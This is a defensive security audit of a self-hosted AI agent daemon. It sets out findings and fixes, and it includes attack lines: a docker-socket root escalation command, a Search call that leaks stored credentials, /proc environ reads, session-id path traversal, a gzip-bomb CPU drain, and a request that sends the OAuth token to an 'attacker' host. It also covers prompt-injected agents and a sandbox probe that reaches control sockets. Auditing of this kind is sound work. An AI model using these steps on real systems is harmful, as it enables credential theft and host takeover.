# Security audit: deployed ycc system (2026-10-26)

Audit scenario: a bearer-authenticated `ycc daemon --web` on `127.0.0.1:8787`,
published through an HTTPS tunnel. The threat model includes shared-host access and
host-networked containers, where loopback is not an isolation boundary.

This public summary preserves the dated code findings, verification methodology, and
mitigations. Personal deployment inventory, credential fingerprints, and private evidence
locators are omitted. It is not a statement of current deployment status.

Method: four parallel read-only review agents (glm — adversarial HTTP/pre-auth probing of the
live daemon + scratch `buildHandler` harness; opus — code audit of everything new since the
Oct-6 fixes; astra — web client sink/dependency audit; claude — token→shell→workstation chain
and host exposure), with the coordinator independently re-verifying every CRITICAL/HIGH claim
and the top code findings. Secrets were never printed; token/key presence was confirmed via
`grep -cF` counts and SHA-256 prefix comparison.

## Status of the 2026-10-06 audit (docs/reports/security-audit-2026-10.md)

The audit verified the four fix commits (5e23b96, 0314c7a, ab9ef80, 59ee60b), using
binary guardrail/token-file markers and behavioral tests rather than assuming source HEAD
matched the tested executable. An unauthenticated 33 MB POST returned 401 in ~30 ms before
the body was read, locally and through the tunnel. `--web`/non-loopback guardrails held;
every one of the 70 Connect methods required the bearer token; pre-auth rejection never
read or decompressed the body (gzip bombs without a token → 401 in milliseconds).
The audit verified the F1/F5 fixes and F2 inspector-disable mitigation. Credential rotation
and removal of retained copies remain separate operational obligations (T1); code deployment
alone does not complete them.

## Findings

### T1 — CRITICAL (operational) — Credential rotation and retained-copy hygiene

A generated state-file token does not replace a credential still supplied through
`YCC_TOKEN`. Fixing an exposure without rotating the active credential leaves access intact.
Retained copies can survive in shell history, event logs, derived databases, analysis exports,
and terminal scrollback. Private copy locations, counts, and token characteristics are omitted.

Restrictive parent-directory modes help against other users but do not isolate same-uid
agents. The file-tool deny covers `~/.config/ycc/**` and `daemon-token`, not arbitrary
historical copies. A prompt-injected agent that finds a copy can gain persistent remote
access; on a privileged deployment, T3 expands that impact.

**Fix:** rotate to a cryptographically generated token, verify which credential source the
running daemon actually uses, and stop putting credentials in shell commands or terminal
automation. Use a 0600 `EnvironmentFile=` for a user service or rely on the state-dir token.
Inventory and scrub retained copies, including derived projections and exports; redact
`Bearer <token>` and known secret values in tool-result emission (the `safeSecretOutput`
mechanism for the Exa key in `internal/tools/web.go` is the model).

### T2 — CRITICAL (operational) — Provider credentials can persist in session logs

The audit confirmed the F6 failure mode: a shell can read `secrets.json`, and unfiltered tool
output can carry credentials into durable logs. Credential equality can be checked privately
without publishing values or fingerprints. The path deny is defense-in-depth, not an OS
boundary; even correctly protected credential files can leak through tool output.

**Fix:** rotate exposed provider keys; scrub affected logs and derived copies; add an
emit-time redaction pass over tool results for known secret values. Default session log
files to 0600 and directories to 0700. Permissive child modes rely on every ancestor staying
private, and copies or exports can lose that protection.

### T3 — CRITICAL (design) — Token holder = unconfined shell; host privileges determine impact

Agent Bash (coordinator/implementer/chat roles) is `sh -c` with the daemon's scrubbed env, no
sandbox, no allowlist (`internal/tools/worker.go:1458,1567`); `internal/sandbox` is used **only
for the reviewer role**, and there is no config knob to confine anything else. If the daemon
user controls a rootful Docker socket, shell access is root-equivalent
(`docker run -v /:/host …`). Sudo policy can further expand privileges.

Probing from inside the reviewer sandbox demonstrated that a read-only `/` and confined
scratch do not prevent access to unmasked control sockets. Docker APIs can mutate the host;
terminal-multiplexer APIs can inject keystrokes into an existing shell. A "read-only reviewer"
therefore needs socket isolation, not just read-only filesystem mounts.

**Fix:** mask `/var/run/docker.sock`, `/tmp/tmux-*` (and ideally loopback) in the sandbox
helper; run agents under a dedicated uid/container without docker/sudo access; until then,
treat the bearer token as a root credential.

### T4 — HIGH (operational) — Public tunnels need defense beyond the bearer token

Without an edge traffic policy, OAuth, IP restriction, or mTLS, a tunnel leaves the bearer
token as the only RPC gate. The web UI is served unauthenticated at `/` by design, exposing
service identification. There is **no failed-auth rate limiting and no failed-auth logging**
(the latency interceptor sits inside auth, so 401s are invisible). A weak or leaked credential
therefore has little defense in depth. Local processes and host-networked containers can
reach `127.0.0.1:8787` directly at high request rates, bypassing tunnel-side controls.

**Fix:** rotate (T1), add failed-auth throttling + logging in `RequireBearer`
(`internal/server/auth.go:27`), and add an ngrok edge gate (OAuth/IP restriction) or switch to
Tailscale with identity — the token must not be the only thing between the internet and root.

### T5 — MEDIUM — Search tool bypasses the credential deny (F6 fix gap; opus, code-verified)

`internal/tools/search.go:220` runs `ws.resolveRead(scope)` on the search root only
(`denyCredentialPath`, `tools.go:515-532`), then ripgrep recurses — matches are never re-checked.
PoC (scratch harness): `Search{pattern:"REFRESHTOKEN", path:"$HOME"}` returned the
`~/.config/ycc/secrets.json` match; the state-dir `daemon-token` is exposed the same way via
`path:"~/.local/state"`. This defeats the Oct-6 deny for **every** role that has Search,
including reviewers. Also: `denyCredentialPath` does not block `/proc/*/environ` (Read
`/proc/self/environ` returns the daemon's own environment, including `YCC_TOKEN`), and an
agent's Bash can read the daemon's env via `/proc/$PPID/environ` (same-uid) even though it is
scrubbed from the child env.

**Fix:** deny scopes that are ancestors of protected locations (or re-check every match);
deny `/proc`/`/sys` paths in `denyCredentialPath`; set `PR_SET_DUMPABLE=0` on the daemon and
read the token from a file instead of the environment; note `internal/projectfs/projectfs.go:236`
and a few other internal `git` calls still run unscrubbed (a `core.fsmonitor` hook sees
`YCC_TOKEN`) — route all execs through one scrubbed-env helper with
`-c core.fsmonitor=false -c core.hooksPath=/dev/null` for daemon-internal git.

### T6 — LOW-MEDIUM — Session-id path traversal in ResumeSession / GetSessionTranscript / GetSessionAttachment

`Manager.Reopen` (`session/session.go:3046+`), `SessionTranscript`, and `SessionAttachment`
join the client-supplied id into the log path with no validation
(`filepath.Join(absWS, ".ycc", "sessions", id, "events.jsonl")`). PoCs: a transcript request
with `../../../…` returned another project's history; `ResumeSession` on a crafted id
chmodded a foreign directory to 0700 and created `events.jsonl` in it; a Resume pointed at a
foreign log made it a **live session of the requesting project** that `SendInput` continues
with forged history. (ed2184f's `persistedSessionProject` validation covers SendInput/Answer
only.) Token-gated, so this is cross-project history read/tamper + targeted filesystem
mutation, not remote unauth access.

**Fix:** one strict `validSessionID` (`^s_[0-9a-f]+$`) check in Reopen, SessionTranscript,
SessionAttachment, SessionLogPath; open attachments with `O_NOFOLLOW`.

### T7 — MEDIUM — Authenticated CPU drain via gzip bomb (glm, harness-verified; defense-in-depth)

connect-go v1.20.0's `Decompress` (`compression.go:82-107`) drains the whole bomb **after** the
`ReadMaxBytes` cap trips, just to count discarded bytes for the error message: a 31 MB wire
body expanding to ~32 GiB burns ~10 s of a core (memory stays bounded — verified; and the
client disconnecting does not cancel it). Requires a valid token, hence MEDIUM.

**Fix:** reject any request `Content-Encoding` in front of the Connect handler (ycc's own
clients never gzip requests), and/or file upstream to stop the drain. Note the 429 also
discloses the exact decompressed size.

### T8 — LOW/MEDIUM — Credential-forwarding leftovers (F9), trusted repo config, misc

- **OAuth token exfil:** `DiscoverModels{backend:"anthropic", base_url:"https://attacker"}`
  still sends the stored Claude OAuth access token to any HTTPS host
  (`config.go:1465-1468`; `validateModelCredentials` only requires https); any non-reserved
  env var/secret (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, …) likewise. `credenv.Register` also
  runs before discovery succeeds, so a bogus `KeyEnv:"PATH"` strips PATH from every agent
  subprocess for the daemon's lifetime (DoS).
- **Repo `[worktree]` config is trusted without prompting** (`session.go:2154`,
  `bootstrap.go:48`): a cloned repo gets `setup` shell execution on its first workstream;
  `copyBootstrapPath` (`bootstrap.go:64`) checks paths lexically only, so a symlinked dir
  copies `secrets.json` into the worktree where the deny does not apply.
- **`stateDir()` / uianalytics fall back to `os.TempDir()`** when HOME is unset → 0755 dirs
  in shared /tmp; fail closed instead.
- **Web client:** "Forget token" only clears the acting tab's module state — other tabs keep
  the in-memory token and stay authorized (no `storage`-event/BroadcastChannel sync). PDF
  previews now render in a same-origin `blob:` iframe without `sandbox` (CSP `frame-src blob:`)
  — content-based MIME detection is sound and no exploit was found, but it's a new trust
  boundary; prefer a sandboxed/isolated viewer or download-only.
- **Pre-auth signals:** `POST /debug/latency` gets a pre-auth 405 from the ServeMux (route +
  method disclosure, no data); `OPTIONS *` → 200; ServeMux 307-redirects `..` paths to a
  cleaned same-origin path. Noise-level.
- **uianalytics:** "owner-only" means file modes only — every token holder can read/write all
  analytics; unbounded catalog growth (1000 entries/client name); consider a client-name
  allow-list and caps.

### T9 — LOW — Adjacent host exposure (workstation-takeover context, beyond ycc)

A daemon audit should consider adjacent administrative UIs, metrics endpoints, ad-hoc file
servers, and container-control privileges. Unauthenticated helper services can expose data
or operational metadata even without directly granting shell execution. Restrictive file
modes do not protect against root-equivalent accounts. Personal service inventory, account
memberships, ports, and key inventory are intentionally omitted from this public report.

**Fix:** restrict helper-service reachability and require appropriate authentication;
review Docker access and sudo policy. Loopback binding reduces remote exposure but does not
isolate a service from other users or host-networked containers.

## Verified solid (highlights)

- All 70 Connect methods (unary + streaming, json/grpc/grpc-web/connect protocols) require the
  token; pre-auth middleware never reads/decompresses the body; constant-time compare; no
  per-method gaps are structurally possible (prefix wrap + interceptor).
- Native h2c/prior-knowledge HTTP/2 changes nothing pre-auth; `Host` is never consulted when a
  token is set (no DNS rebinding); embedded-FS web handler immune to traversal; timeouts,
  header limits, and stream caps are in place.
- Oct-6 fixes hold at HEAD: credential scrubbing covers foreground/background Bash, sandbox,
  rg, git review env, bootstrap, workstream integrate; reserved-name + HTTPS model-RPC checks;
  `llmhttp.CheckRedirect` on all credential-bearing clients; `--web`/loopback guardrails.
- Web client: no HTML/eval sinks anywhere (incl. new Activity/inbox/usage panels); markdown
  lexer-only with allow-listed links; token only in localStorage/Authorization, never URLs;
  raster-only attachment allow-list holds against SVG/MIME-param/data-URL variants; deps and
  lockfile clean (Darwin-only fsevents hook); dist manifest matches a fresh typecheck/build
  hash. Connect transport uses `redirect: "error"`.
- Credential-storage checks covered owner-only files and directories, the full parent
  permission chain, and CSPRNG state-token generation. Those controls must also cover
  copies and exports; they do not isolate same-uid agents.
- Workstream paths use `ContainedPath`/`VerifyUnderRoot`, re-verified before removal; no
  client-path RemoveAll; activity SQL parameterized; GetJobOutput session-scoped and capped.

## Recommended order

1. **First (operational):** rotate exposed daemon/provider credentials, verify the active
   credential source, and stop putting secrets in command lines or terminal automation.
   Scrub retained copies, including logs, projections, history, and exports (T1, T2).
2. **Outer gate:** ngrok traffic-policy OAuth/IP restriction (or Tailscale), plus
   failed-auth rate limiting/logging in `RequireBearer` (T4).
3. **Contain the blast radius:** mask docker/tmux sockets and loopback in the sandbox; plan a
   dedicated uid for the daemon/agents without root-equivalent control privileges (T3).
4. **Code fixes:** Search re-check + `/proc` deny + `PR_SET_DUMPABLE` (T5); session-id
   validation (T6); emit-time secret redaction + 0600 default logs (T2); reject request
   `Content-Encoding` pre-Connect (T7); OAuth-fallback/`base_url` tightening and
   `credenv.Register` ordering (T8); forget-token tab sync (T8).
